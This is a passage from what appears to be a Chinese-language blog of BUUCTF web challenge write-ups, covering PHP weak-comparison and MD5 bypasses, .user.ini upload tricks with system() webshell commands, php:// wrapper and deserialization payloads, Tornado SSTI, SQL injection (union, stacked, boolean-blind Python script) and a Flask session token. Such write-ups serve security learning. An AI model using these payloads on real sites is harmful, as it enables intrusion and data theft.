函数用于检测变量是否为数字或数字字符串。    {        exit("Just num!");    }    $key = intval($key);#intval() 函数用于获取变量的整数值。    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";    if($key == $str) {        echo $flag;    }}else {    echo "Try to find out source file!";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在PHP中：<br>== 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a=123和b=123admin456进行==比较时。则b只会截取前面的整数部分。即b转化成123。<br><code>?key=123</code></p><hr><h3 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a>[BJDCTF2020]Easy MD51</h3><p><del>不是源代码的copy者，只是源代码的搬运工。。。</del><br><a href="https://">https://www.runoob.com/php/func-filesystem-file-get-contents.html</a><br><a href="https://">https://www.iteye.com/blog/jun1986-1176909</a></p><pre class="line-numbers language-none"><code class="language-none">《?phpheader('hint:select * from \'admin\' where password='.'md5($pass,true)');?&gt;《?phperror_reporting(0);$password = $_GET['password'];if($password == 'ffifdyop')#看见==，似乎知道要考弱类型。。。{    echo "&lt;script&gt;window.location.replace('./levels91.php')&lt;/script&gt;";#window.location.replace(“url”)：将地址替换成新url，该方法通过指定URL替换当前缓存在历史里（客户端）的项目，}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">《?phperror_reporting(0);$a = $_GET['a'];$b = $_GET['b'];if($a != $b &amp;&amp; md5($a) == md5($b))#看见==，似乎知道要考弱类型。。。{    echo "&lt;script&gt;window.location.replace('./levell14.php')&lt;/script&gt;";}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pick.lwzheng.tech/2025/01/16/6787e1522f1ff.png" alt="7d1a019efadddab9ceae5ab701ab76fe.png"><br><del>唉，爆了爆了</del>，=》glzjin<a href="https://">https://github.com/glzjin</a></p><pre class="line-numbers language-none"><code class="language-none">《?phperror_reporting(0);include "flag.php";highlight_file(__FILE__);if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){    echo $flag;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>此时我才意识到不该看源代码的，相当于看wp了，我又又又又忘了（哭</del><br><del>好吧就当我什么也没看到（</del><br>burp找到的<br><img src="https://pick.lwzheng.tech/2025/01/16/678861c433699.png" alt="372588dbab00b81c163759fc1c782888.png"><br><a href="https://">https://www.w3school.com.cn/php/func_string_md5.asp</a><br>md5=》为’ ‘ or 1(true)即可通过<br>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。<br>要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。<br>布尔值：布尔值&nbsp;false&nbsp;本身为假。<br>整数：值为&nbsp;0&nbsp;的整数被视为&nbsp;false&nbsp;，例如&nbsp;0&nbsp;、&nbsp;0.0&nbsp;（因为在比较时&nbsp;0.0&nbsp;会被转换为整数&nbsp;0&nbsp;）。<br>空字符串：&nbsp;“”&nbsp;（双引号）或者&nbsp;‘’&nbsp;（单引号）空字符串为假。<br>空数组：&nbsp;array()&nbsp;或者&nbsp;[]&nbsp;表示的空数组被判定为&nbsp;false&nbsp;。<br>特殊类型值：&nbsp;null&nbsp;和&nbsp;undefined&nbsp;（在PHP严格模式下没有真正的&nbsp;undefined&nbsp;，不过在一些比较宽松的情况下可以类似理解）被判定为&nbsp;false&nbsp;。<br>未初始化的变量：在一些情况下，未初始化的变量如果在条件判断中使用，会发出警告并且被视为&nbsp;false&nbsp;。<br>其他情况一般都被判定为&nbsp;true<br>只要’or’后面的字符串为一个非零的数字开头都会返回True<br>偷的脚本</p><pre class="line-numbers language-none"><code class="language-none">《?phpfor ($i = 0;;) {    for ($c = 0; $c &lt; 1000000; $c++, $i++)        if (stripos(md5($i, true), '\'or\'') !== false)#stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）找一下or哈            echo "\nmd5($i) = " . md5($i, true) . "\n";    echo ".";}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到一个<br><img src="https://pick.lwzheng.tech/2025/01/16/67887746f3929.png" alt="605c2ccf2407e4c907602cdff46897c8.png"><br>但从源代码<code>if($password == 'ffifdyop')</code>来看已经定死了ffifdyop（唉，定制<br><del>估计出题人想的是特例秒了没想到会有憨憨真的一个一个找</del><br>这是”ffifdyop”md5后<br><img src="https://pick.lwzheng.tech/2025/01/16/678878af4544a.png" alt="dbe8bbbaaee382b724bb08151d262e0d.png"><br>然后考md5碰撞<br><a href="https://">https://blog.csdn.net/qq_64201116/article/details/126493091</a><del>(唉已经有前人栽树了</del></p><blockquote><p>字符串之间进行比较，想要绕过这个弱比较只能用0e的方式。在PHP中”0e”判断为科学计数法，0e123就是0的10123次方，不难推出：0e123456789==0e1 // 因为0的任意次方都为0。在0e后面不能含有字母！！！否则判断为False<br>随便选几个就行了</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?a=MMHUWUV&amp;b=MAUXXQC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>md5_1[]=1&amp;md5_2[]=2<br>因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null=null，逻辑关系为True。所以可以输出flag<br>唉自己搞的hackbar的插件真是不好用，好几次post都不行，最后用的burpsuit。大家还是用火狐的hackbar吧<br><img src="https://pick.lwzheng.tech/2025/01/16/6788822eb58c6.png" alt="bdc102e6223dabb4ac703c4748781ed6.png"></p></blockquote><hr><h3 id="MRCTF2020-你传你🐎呢1"><a href="#MRCTF2020-你传你🐎呢1" class="headerlink" title="[MRCTF2020]你传你🐎呢1"></a>[MRCTF2020]你传你🐎呢1</h3><p><del><em>开幕鬼图。。。</em></del><br>用repeater试了一下，猜测可能是尾部不能有php。且Content-Type需为png/jpeg。。。<br><strong>Q</strong>:用asp，但好像试了一下不行。<br><img src="https://pick.lwzheng.tech/2025/01/16/6788cd12953ec.png" alt="72005344cc19cb2fd346af3175db3dce.png"><br>猜测是asp没被解析（是吗？<br>然后用了.htaccess，改一下Content-Type访问即可。<br>还有就是不要访问/var/www/html/upload/f46c7557e25c244fb27f31414303dcf9/pass.png 而是upload/f46c7557e25c244fb27f31414303dcf9/pass.png。</p><hr><h3 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h3><p><a href="https://">https://www.runoob.com/php/php-preg_match.html</a></p><pre class="line-numbers language-none"><code class="language-none">《?php  $text = $_GET["text"];$file = $_GET["file"];$password = $_GET["password"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){#需要一个txt文件    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";    if(preg_match("/flag/",$file)){#查找是否有"flag"        echo "Not now!";        exit();     }else{        include($file);  //useless.php        $password = unserialize($password);        echo $password;    }}else{    highlight_file(__FILE__);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?text=file://D:\Desktop\ctf\ctf\buuctf\welcome to the zjctf.txt</code>不行<br><a href="https://">https://www.cnblogs.com/zzjdbk/p/13030717.html</a><br><a href="https://">https://www.php.net/manual/zh/wrappers.data.php</a><br><img src="https://pick.lwzheng.tech/2025/01/16/6788e906d0a65.png" alt="6181f5b97cc3a19e68afb5284cb03a94.png"><br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code><br>看不见的useless.php究竟是何方神圣。。。<br><code>&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p><pre class="line-numbers language-none"><code class="language-none">《?php  class Flag{  //flag.php      public $file;      public function __tostring(){  #__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。        if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo "&lt;br&gt;";        return ("U R SO CLOSE !///COME ON PLZ");        }      }  }  ?&gt;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://">https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring</a></p><blockquote><p>在 PHP 编程中，是不能用echo语句直接输出一个对象的，也不能用字符串连接符 (.) 拼接一个对象<br>要想输出的话，就要把实体对象转换成字符串，这也正是__tostring函数的意义所在。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$password=new Flag;echo $password;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但显示“must return a string value in”<br>想到password会unserialize一次，serialize后正是字符串，toString() 方法用于一个类被当成字符串时应怎样回应<del>（好巧</del></p><pre class="line-numbers language-none"><code class="language-none">《?phpclass Flag{  //flag.phppublic $file='flag.php';public function __tostring(){  #__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。if(isset($this-&gt;file)){echo file_get_contents($this-&gt;file);echo "&lt;br&gt;";return ("U R SO CLOSE !///COME ON PLZ");}}}$password=new Flag;$password=serialize($password);echo $password;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>怎么连起来呢？用<code>include($file)</code>，将useless.php用起来。。。<br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code><br>oh u find it,在源代码里。</p><hr><p><del>小趣事剧场</del><br>第一次忘给加flag.php引号了，然后得到flagphp<br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:7:"flagphp";}</code><br>于是：<code>U R SO CLOSE !///COME ON PLZ</code><br><del>很好，看到这个时人都不好了</del></p><hr><h3 id="护网杯-2018-easy-tornado1"><a href="#护网杯-2018-easy-tornado1" class="headerlink" title="[护网杯 2018]easy_tornado1"></a>[护网杯 2018]easy_tornado1</h3><pre class="line-numbers language-none"><code class="language-none">/flag.txtflag in /fllllllllllllag/welcome.txtrender/hints.txtmd5(cookie_secret+md5(filename))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>标题是龙卷风</del><br><a href="https://">https://www.osgeo.cn/tornado/template.html</a></p><blockquote><pre class="line-numbers language-none"><code class="language-none">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页RequestHandler.render(template_name: str, **kwargs: Any)→ Future[None][源代码]¶以给定参数作为响应呈现模板。ender是python的一个渲染函数，他们的url都是由filename和filehash组成，filehash即为他们filename的md5值。Tornado模板支持 控制语句 和 表达 . 控制语句被包围 {{% 和 %}} ，例如 {{% if len(items) &gt; 2 %}} . 表达式被包围 {{{{ 和 }}}} ，例如 {{{{ items[0] }}}} .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><del>。。。不是，这给我干哪儿了</del><br><a href="https://">https://www.cnblogs.com/-chenxs/p/11971164.html</a><br>。。。好吧，XXS士别三日当刮目相看（<br><a href="https://">https://blog.csdn.net/miuzzx/article/details/123329244</a><br><del>唉龙卷风的实力</del><br><a href="https://">https://www.cnblogs.com/bmjoker/p/13508538.html</a><br><del>感情现在才知道是考SSTI(好吧我是第一次听这个东西</del><br><a href="https://">https://www.cnblogs.com/cimuhuashuimu/p/11544455.html</a><br>找到了~<br>不是，想看看龙卷风的SSTI结果发现龙卷风的唯一例子就是从这道题取得啊<del>（小众宝藏模板实锤了</del><br><img src="https://pick.lwzheng.tech/2025/01/16/6789255875e3a.png" alt="83e80f39bdc56c99964045d59a0303c1.png"><br>在这里改一下filehash后得到error界面<br><img src="https://pick.lwzheng.tech/2025/01/16/6789259d5b990.png" alt="ec88202d1c253015146f2f861622ed36.png"><br>上方链接说得就不赘述了<br><code>error?msg={{handler.settings}}</code><br>AI真是智能，浅浅让它改改语法漏洞百出的python脚本（dbq我会努力的</p><pre class="line-numbers language-none"><code class="language-none">import hashlibfilename = '/fllllllllllllag'cookie_secret = 'fb5a8768-2485-4575-a5c6-f336fae93f01'# 将文件名编码为字节类型filename_bytes = filename.encode('utf-8')mid = hashlib.md5(filename_bytes)# 获取十六进制哈希值mid_hex = mid.hexdigest()result = cookie_secret + mid_hex# 对拼接后的结果计算MD5哈希值final_hash = hashlib.md5(result.encode('utf-8'))print(final_hash.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实这次payload在原url上改挺方便的。。。<br><code>?filename=/fllllllllllllag&amp;filehash=b52ee6e6b21e8ce79913379fd4aeb5e2</code></p><hr><h3 id="MRCTF2020-Ez-bypass1"><a href="#MRCTF2020-Ez-bypass1" class="headerlink" title="[MRCTF2020]Ez_bypass1"></a>[MRCTF2020]Ez_bypass1</h3><p>怎么这么多md5…</p><pre class="line-numbers language-none"><code class="language-none">if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) {    $id=$_GET['id'];    $gg=$_GET['gg'];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {        echo 'You got the first step';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?gg[]=1&amp;id[]=2</code></p><pre class="line-numbers language-none"><code class="language-none">if(isset($_POST['passwd'])) {            $passwd=$_POST['passwd'];            if (!is_numeric($passwd))#如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE            {                 if($passwd==1234567)                 {                     echo 'Good Job!';                     highlight_file('flag.php');                     die('By Retr_0');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>passwd=1234567ab</code></p><hr><h3 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h3><p><a href="https://">https://www.freebuf.com/articles/web/287193.html</a><br>先试了试，上传木马到是正常方法绕过即可（%00也试过却不可），但发现上传 .htaccess 想加GIF89a，但又不能加。。。<br><img src="https://pick.lwzheng.tech/2025/01/18/678b99a87bd74.png" alt="60b35f867b5571edfe827aea70dc157d.png"><br>.htaccess的配置文件只能在Apache服务器中起作用（哭</p><blockquote><p>能够利用.user.ini的条件：<br>服务器脚本语言为PHP 服务器使用CGI<br>FastCGI模式<br>上传目录下要有可执行的php文件</p><pre class="line-numbers language-none"><code class="language-none">auto_prepend_file = &lt;filename&gt;         //包含在文件头auto_append_file = &lt;filename&gt;          //包含在文件尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">GIF89aauto_prepend_file=pass.gif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>先上传pass.gif再上传.user.ini<br>访问<code>/uploads/5e6f2693d111128ec4f1d7336f65b87f/index.php</code><br>.user.ini中auto_prepend_file=pass.gif会在执行index.php前把pass包含进来，且解析为php格式<br>ps:user.ini里有个user_ini.cache_ttl ，它控制着重新读取用户 ini文件的时间，可能时间一到刷新掉了，这时要重新上传.user.ini。</p><pre class="line-numbers language-none"><code class="language-none">?pass=system("ls /");  或?pass=var_dump(scandir("/")); // 扫描当前目录下的文件，并打印出来 ?pass=system("cat /flag");  或?pass=var_dump(file_get_contents("/flag"));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>一开始试了试username是admin没想到蒙对了（<br>在burp中找到了这个（这是啥<br><code>&lt;--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</code><br>先base32再base64得到<code>select * from user where username = '$name'</code><br><del>好吧谢谢但我已经蒙出username了</del><br>用字典intrude了一下发现or,=，（，）都被过滤了。使用大小写绕过or,使用like绕过=<br><a href="https://">https://blog.csdn.net/weixin_40950781/article/details/100061268</a><br>SELECT 1,2,3&nbsp; 是一个简单的查询语句，它会返回一行包含三个列的数据，这三个列的值分别为 &nbsp;1&nbsp;、&nbsp;2&nbsp; 和 &nbsp;3&nbsp;。&nbsp;SELECT&nbsp; 关键字用于指定要从数据库中检索的数据。在这种情况下，我们没有从任何表中获取数据，而是直接指定了要返回的具体值。<br><code>1' union select 1,2,3# </code>有三个字段<br>搞password用<code>select * fRom user where username like 'admin'</code>还是错的（哭<br><del>偷看源码</del>发现用了md5（我：啊？？？？<br><a href="https://">https://github.com/imagin-sch/GXY_CTF/blob/master/Web/BabySqli/dockerfile/files/html/search.php</a><br><a href="https://">https://www.runoob.com/php/func-mysqli-fetch-row.html</a><br><a href="https://">https://www.runoob.com/php/func-mysqli-query.html</a></p><pre class="line-numbers language-none"><code class="language-none">$name = $_POST['name'];$password = $_POST['pw'];$t_pw = md5($password);$sql = "select * from user where username = '".$name."'";// echo $sql;$result = mysqli_query($con, $sql);#mysqli_query() 函数执行某个针对数据库的查询。$arr = mysqli_fetch_row($result);#从**数据库**结果集中获取一行数据的函数。它返回一个枚举数组，其中每个结果**列**存储在从0开始的数组偏移量中。if($arr[1] == "admin"){if(md5($password) == $arr[2]){echo $flag;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>arr[0]，[1]，[2]分别对应union select 1,2,3#<br>arr[1]是admin,[2]是password=&gt;union select 1,’admin’,password#<br>现在要求arr[2]即union select的3（password)md5后与password相等即可<br>username:<code>7' union select 1,'admin','8f14e45fceea167a5a36dedd4bea2543'# (这里第一个不能是admin，不然会直接跳转到wrong pass</code><br>password:<code>7(7是我的幸运数字^_^</code></p><hr><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>扔进burp 过一下字典（<br><del>结果直接爆出来了（啊？</del><br><code>1' or 1=1#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd79cb6b0b.png" alt="e35b88b5086142e59614ceecd58e31fe.png"><br><code>return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);</code><br><code>1';show database();#</code><br><code>1';show tables;#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd79c3caa1.png" alt="abe40dfce048a68691247cc280c3e2f5.png"><br><code>1'; show columns from FlagHere;#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd8de49914.png" alt="1753b9108c6497effa9223a7ed50a885.png"><br><code>1';handler FlagHere open as </code>ddl<code>;handler </code>ddl<code> read next;#</code><br>得到flag?????<br><img src="https://pick.lwzheng.tech/2025/01/19/678cdc5539e8c.png" alt="ccbd38ab641e15b7ff867aec3b9fb0d9.png"><br><del>那我请问这道题跟[强网杯 2019]随便注有啥区别呢（</del><br><del>多给个114514试图迷惑（即答</del></p><hr><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p><code>1</code> =&gt;<code>Hello, glzjin wants a girlfriend.</code><br>开幕雷击（<del>实在不行咱放弃吧哥</del><br><code>2</code> =&gt;<code>Do you want to be my girlfriend?</code><br>哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈<br>除1，2之外的都挂了（<br>页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。<br>输入1+空格返SQL Injection Checked.<del>（又欺负空格</del><br>if(ascii(substr((select flag from flag),1,1))&gt;1,1,2)<br>if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)<br>或(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p><blockquote><p>&nbsp;if()&nbsp; 函数一般接受三个参数，第一个参数是条件判断，后面两个参数分别是条件为真和为假时返回的值。</p></blockquote><p>下面那个则是单纯1,0判断。<br><a href="https://">https://blog.csdn.net/python1639er/article/details/112325519</a><br><a href="https://">https://www.begtut.com/python/ref-requests-post.html</a></p><pre class="line-numbers language-none"><code class="language-none">&gt; # 用布尔盲注得出flag:二分法，做ascii循坏i，当返回为1时取此时的ascii(i)再转换为字符(ascii(substr((select(flag)from(flag)),j,1))&gt;i)(0&lt;=i&lt;=127,0&lt;=j&lt;50)&gt; import requests&gt; &gt; # requests&nbsp; 模块用于发送 HTTP 请求，这里主要用于向目标网站发送 POST 请求。&gt; url = "http://7cd8bda1-df2d-4a3d-af9f-66850cce8b1c.node5.buuoj.cn:81/index.php"&gt; result = ""&gt; for i in range(1, 50):#~~第一次设的30然后还没输出完就结束了~~&gt;     for j in range(1, 128):&gt;         payload = "(ascii(substr((select(flag)from(flag)),{m},1))&gt;{n})"  # &nbsp;{m}&nbsp; 和 &nbsp;{n}&nbsp; 是占位符，会被 &nbsp;i&nbsp; 和 &nbsp;j&nbsp; 的值替换。&gt;         response = requests.post(url=url, data={'id': payload.format(m=i,n=j)})  # 使用 &nbsp;requests.post&nbsp; 方法向目标 URL 发送 POST 请求，请求的参数是 &nbsp;id&nbsp;，其值为构造的 SQL 注入 payload。&gt;         # requests.post(url, data={key: value}, json={key: value}, args)&gt;         if response.text.find('girlfriend') == -1:  # 检查响应文本中是否包含字符串 &nbsp;girlfrined(疯狂迫害&gt;             result = result + chr(j)#将对应的字符 &nbsp;chr(j)&nbsp; 添加到 &nbsp;result&nbsp; 中，在 Python 中，&nbsp;+&nbsp; 运算符用于字符串时，它的作用是将两个字符串连接起来，生成一个新的字符串。&gt;             break#跳内层循环&gt;     print(result)#看进度&gt; print(result)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得好慢~</p><pre class="line-numbers language-none"><code class="language-none">fflflaflagflag{flag{2flag{27flag{274flag{2744flag{2744dflag{2744d1flag{2744d15flag{2744d15fflag{2744d15f-flag{2744d15f-2flag{2744d15f-2aflag{2744d15f-2a4flag{2744d15f-2a4aflag{2744d15f-2a4a-flag{2744d15f-2a4a-4flag{2744d15f-2a4a-45flag{2744d15f-2a4a-459flag{2744d15f-2a4a-4599flag{2744d15f-2a4a-4599-flag{2744d15f-2a4a-4599-bflag{2744d15f-2a4a-4599-b9flag{2744d15f-2a4a-4599-b90flag{2744d15f-2a4a-4599-b90eflag{2744d15f-2a4a-4599-b90e-flag{2744d15f-2a4a-4599-b90e-fflag{2744d15f-2a4a-4599-b90e-fcflag{2744d15f-2a4a-4599-b90e-fceflag{2744d15f-2a4a-4599-b90e-fcedflag{2744d15f-2a4a-4599-b90e-fced2flag{2744d15f-2a4a-4599-b90e-fced24flag{2744d15f-2a4a-4599-b90e-fced242flag{2744d15f-2a4a-4599-b90e-fced2422flag{2744d15f-2a4a-4599-b90e-fced2422bflag{2744d15f-2a4a-4599-b90e-fced2422bcflag{2744d15f-2a4a-4599-b90e-fced2422bc2flag{2744d15f-2a4a-4599-b90e-fced2422bc23flag{2744d15f-2a4a-4599-b90e-fced2422bc23}flag{2744d15f-2a4a-4599-b90e-fced2422bc23}flag{2744d15f-2a4a-4599-b90e-fced2422bc23}flag{2744d15f-2a4a-4599-b90e-fced2422bc23}flag{2744d15f-2a4a-4599-b90e-fced2422bc23}flag{2744d15f-2a4a-4599-b90e-fced2422bc23}flag{2744d15f-2a4a-4599-b90e-fced2422bc23}flag{2744d15f-2a4a-4599-b90e-fced2422bc23}flag{2744d15f-2a4a-4599-b90e-fced2422bc23}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>这界面好熟悉。。。。像极了“我的第一个flask“什么的（被打</p><!-- https://github.com/woadsl1234/hctf_flask/ --><p>然后发现404了（</p><p><del>但总之最后是偷来了</del></p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">客户端 session 导致的安全问题 | 离别歌</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>h1 <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"nav"</span><span class="token operator">&gt;</span>hctf<span class="token punctuation">{</span>xxxxxxxxx<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'ckj123'</span><span class="token comment">#看来大家都爱用名字作key呀（感慨ing</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    image<span class="token punctuation">,</span> code <span class="token operator">=</span> get_verify_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 图片以二进制形式写入</span>    buf <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span>    buf_str <span class="token operator">=</span> buf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 把buf_str作为response返回前端，并设置首部字段</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>buf_str<span class="token punctuation">)</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/gif'</span>    <span class="token comment"># 将验证码字符串储存在session中</span>    session<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flask的session是存储在cookie中且仅签名而未加密</p><pre class="line-numbers language-none"><code class="language-none">#先把session拿出来.eJxF0MFuwjAMBuBXmXzmAC29IHEApetAiqNGKZVzQQxK06RhWgG1FPHuK0zazr_9_bLvsD02xdnA7NJcixFsqwPM7vD2CTPg1tQiTzvqpdVsU2smK7S11Yl0nMUR-o3Vam04yzpS0lGetqjeLVdlhEncUUA3bdNOqHRCPus1W0XYL26kspYrdxOKpsiWtUikFyztkJUt5tl0MBwpNMN8KNTSoEdDwbvT1kXIDjXlm0qzxWDKSrBVMOzO4TGC_bk5bi9frjj9n_Cs7vdjUnH4JNCWvbZZKHI0GGQ9T9aGPE11Hoc8SNuB9nwxf3GV35XFnySV_CjS3-S080MA39WphBFcz0XzehtMxvD4AYitbJY.Z6NK_Q.c9Wsxg_Bj6vn0mKgkPavhwsLBi8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <a 